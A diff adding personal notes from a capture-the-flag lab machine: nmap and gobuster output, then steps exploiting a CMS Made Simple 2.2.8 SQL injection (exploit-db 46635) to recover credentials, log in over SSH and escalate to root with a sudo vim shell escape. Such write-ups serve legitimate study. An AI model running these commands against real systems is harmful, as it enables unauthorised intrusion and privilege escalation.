@@ -1,0 +1,88 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 11:05 CEST
+Nmap scan report for 10.10.108.76
+Host is up (0.038s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.58.163
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 294269149ecad917988c27723acda923 (RSA)
+|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
+|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), Linux 5.4 (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   36.59 ms 10.9.0.1
+2   37.87 ms 10.10.108.76
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.108.76
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/29 11:07:15 Starting gobuster in directory enumeration mode
+===============================================================
+/simple               (Status: 301) [Size: 313] [--> http://10.10.108.76/simple/]
+/server-status        (Status: 403) [Size: 300]
+
+===============================================================
+2023/04/29 11:21:12 Finished
+===============================================================
+
+
+looking through the website we see that it's running CMSMS v2.2.8
+
+there are two exploits we can use for this on exploit-db, will start with the msf-module: exploit/multi/http/cmsms_showtime2_rce
+
+downloaded a file called ForMitch.txt over FTP 
+
+also found an admin login form under /simple/admin/login.php
+
+using the exploit: https://www.exploit-db.com/exploits/46635
+
+with this command: python3 46635.py -u http://10.10.108.76/simple --crack -w /usr/share/wordlists/rockyou.txt
+ 
+although there is some issue with the cracking aspect of the exploit it gave the following results:	[+] Salt for password found: 1dac0d92e9fa6bb2
+													[+] Username found: mitch
+													[+] Email found: admin@admin.com
+													[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+
+let's just assume that python isn't complaining: we would get the password: secret
+
+logged into ssh as follows: ssh mitch@10.10.108.76 -p 2222
+
+gained a root shell with the following command: sudo vim -c ':!/bin/sh'
